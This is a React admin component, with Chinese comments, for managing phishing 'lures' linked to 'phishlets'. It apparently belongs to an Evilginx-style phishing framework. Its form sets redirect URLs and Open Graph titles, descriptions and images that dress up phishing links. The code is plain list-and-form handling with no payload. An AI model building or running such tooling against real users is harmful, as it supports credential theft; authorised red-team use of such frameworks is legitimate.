// src/views/lures/LureList.js
import React, { useState, useEffect } from 'react'
import axios from 'axios'
import {
  CCard,
  CCardBody,
  CCardHeader,
  CButton,
  CTable,
  CTableHead,
  CTableRow,
  CTableHeaderCell,
  CTableBody,
  CTableDataCell,
  CFormInput,
  CFormSwitch,
  CModal,
  CModalHeader,
  CModalTitle,
  CModalBody,
  CModalFooter,
} from '@coreui/react'
import { toast } from 'react-toastify'

const LureList = () => {
  // lure 列表数据
  const [lures, setLures] = useState([])
  // 新建 Lure 表单状态（只需填写 phishlet 名称，其它字段为可选）
  const [newLurePhishlet, setNewLurePhishlet] = useState('')
  const [newLureRedirectUrl, setNewLureRedirectUrl] = useState('')
  const [newLureOgTitle, setNewLureOgTitle] = useState('')
  const [newLureOgDescription, setNewLureOgDescription] = useState('')
  const [newLureOgImageUrl, setNewLureOgImageUrl] = useState('')
  const [newLureModalVisible, setNewLureModalVisible] = useState(false)

  // 获取 lure 列表
  const fetchLures = async () => {
    try {
      const res = await axios.get('/api/lures')
      if (Array.isArray(res.data)) {
        setLures(res.data)
      } else {
        console.error('Lures response is not an array:', res.data)
        setLures([])
      }
    } catch (error) {
      console.error('Failed to fetch lures:', error)
    }
  }

  useEffect(() => {
    fetchLures()
  }, [])

  // 创建 Lure，后端会自动生成 ID 和 path
  const handleCreateLure = async () => {
    try {
      const payload = {
        phishlet: newLurePhishlet,
        redirect_url: newLureRedirectUrl,
        og_title: newLureOgTitle,
        og_description: newLureOgDescription,
        og_image_url: newLureOgImageUrl,
      }
      const res = await axios.post('/api/lures', payload)
      if (res.data.success) {
        toast.success('Lure 创建成功')
        setNewLureModalVisible(false)
        // 清空表单
        setNewLurePhishlet('')
        setNewLureRedirectUrl('')
        setNewLureOgTitle('')
        setNewLureOgDescription('')
        setNewLureOgImageUrl('')
        fetchLures()
      } else {
        toast.error('Lure 创建失败：' + res.data.error)
      }
    } catch (error) {
      toast.error('创建 Lure 出错：' + error.message)
    }
  }

  // 删除 Lure，根据 lure.id（id 为数字字符串，由后端自动生成）
  const handleDeleteLure = async (lureId) => {
    if (!window.confirm(`确定要删除 lure ${lureId} 吗？`)) return
    try {
      // 使用 query 参数 "id" 而不是 "index"
      const res = await axios.delete(`/api/lures?id=${lureId}`)
      if (res.data.success) {
        toast.success('Lure 删除成功')
        fetchLures()
      } else {
        toast.error('删除失败：' + res.data.error)
      }
    } catch (error) {
      toast.error('删除 Lure 出错：' + error.message)
    }
  }

  // 切换 Lure 状态：paused 为 0 表示启用，否则表示暂停
  const handleToggleLure = async (lure) => {
    // 如果当前启用（paused===0），则设置为暂停（例如暂停 1 天），否则设为启用（0）
    const newPaused = lure.paused === 0 ? Date.now() + 86400000 : 0
    try {
      // 这里假设后端 PUT 接口需要传 { id, lure }，其中 id 为 lure.id（转换为数字）
      const id = parseInt(lure.id, 10)
      const updatedLure = { ...lure, paused: newPaused }
      const res = await axios.put('/api/lures', { id, lure: updatedLure })
      if (res.data.success) {
        toast.success('Lure 状态更新成功')
        fetchLures()
      } else {
        toast.error('更新失败：' + res.data.error)
      }
    } catch (error) {
      toast.error('更新 Lure 出错：' + error.message)
    }
  }

  return (
    <div className="p-4">
      <CCard>
        <CCardHeader className="d-flex justify-content-between align-items-center">
          <span>Lures 管理</span>
          <CButton color="primary" onClick={() => setNewLureModalVisible(true)}>
            新建 Lure
          </CButton>
        </CCardHeader>
        <CCardBody>
          <CTable striped responsive>
            <CTableHead>
              <CTableRow>
                <CTableHeaderCell>ID</CTableHeaderCell>
                <CTableHeaderCell>Phishlet</CTableHeaderCell>
                <CTableHeaderCell>Path</CTableHeaderCell>
                <CTableHeaderCell>Redirect URL</CTableHeaderCell>
                <CTableHeaderCell>OG Title</CTableHeaderCell>
                <CTableHeaderCell>状态</CTableHeaderCell>
                <CTableHeaderCell>操作</CTableHeaderCell>
              </CTableRow>
            </CTableHead>
            <CTableBody>
              {lures.map((lure) => (
                <CTableRow key={lure.id}>
                  <CTableDataCell>{lure.id}</CTableDataCell>
                  <CTableDataCell>{lure.phishlet}</CTableDataCell>
                  <CTableDataCell>{lure.path}</CTableDataCell>
                  <CTableDataCell>{lure.redirect_url || '--'}</CTableDataCell>
                  <CTableDataCell>{lure.og_title || '--'}</CTableDataCell>
                  <CTableDataCell>
                    <CFormSwitch
                      checked={lure.paused === 0}
                      onChange={() => handleToggleLure(lure)}
                    />
                  </CTableDataCell>
                  <CTableDataCell>
                    <CButton
                      color="danger"
                      size="sm"
                      onClick={() => handleDeleteLure(lure.id)}
                    >
                      删除
                    </CButton>
                  </CTableDataCell>
                </CTableRow>
              ))}
            </CTableBody>
          </CTable>
        </CCardBody>
      </CCard>

      {/* 新建 Lure 弹窗 */}
      <CModal visible={newLureModalVisible} onClose={() => setNewLureModalVisible(false)}>
        <CModalHeader onClose={() => setNewLureModalVisible(false)}>
          <CModalTitle>新建 Lure</CModalTitle>
        </CModalHeader>
        <CModalBody>
          <CFormInput
            label="Phishlet 名称"
            value={newLurePhishlet}
            onChange={(e) => setNewLurePhishlet(e.target.value)}
          />
          <CFormInput
            label="Redirect URL (可选)"
            value={newLureRedirectUrl}
            onChange={(e) => setNewLureRedirectUrl(e.target.value)}
            className="mt-3"
          />
          <CFormInput
            label="OG Title (可选)"
            value={newLureOgTitle}
            onChange={(e) => setNewLureOgTitle(e.target.value)}
            className="mt-3"
          />
          <CFormInput
            label="OG Description (可选)"
            value={newLureOgDescription}
            onChange={(e) => setNewLureOgDescription(e.target.value)}
            className="mt-3"
          />
          <CFormInput
            label="OG Image URL (可选)"
            value={newLureOgImageUrl}
            onChange={(e) => setNewLureOgImageUrl(e.target.value)}
            className="mt-3"
          />
        </CModalBody>
        <CModalFooter>
          <CButton color="secondary" onClick={() => setNewLureModalVisible(false)}>
            取消
          </CButton>
          <CButton color="primary" onClick={handleCreateLure}>
            创建
          </CButton>
        </CModalFooter>
      </CModal>
    </div>
  )
}

export default LureList
